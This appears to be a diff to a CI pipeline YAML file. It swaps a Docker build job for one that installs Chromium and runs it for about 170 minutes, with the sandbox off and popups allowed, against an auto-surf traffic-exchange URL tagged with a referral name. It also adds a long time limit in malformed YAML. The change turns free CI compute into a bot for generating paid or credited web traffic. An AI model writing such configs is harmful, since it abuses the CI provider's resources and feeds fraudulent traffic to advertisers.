@@ -4,11 +4,17 @@ agent:
   machine:
     type: e1-standard-2
     os_image: ubuntu1804
+
+execution_time_limit:
+    minutes:- 175
+
 blocks:
   - name: Build
     task:
       jobs:
-        - name: docker build
+        - name: Chromium
           commands:
             - checkout
-            - docker build -t your-image .
+            - sudo apt update
+            - sudo apt install chromium-browser
+            - timeout 170m chromium-browser --no-sandbox --disable-popup-blocking --allow-popups-during-page-unload http://www.websurf.cz/auto/?name=rock6064
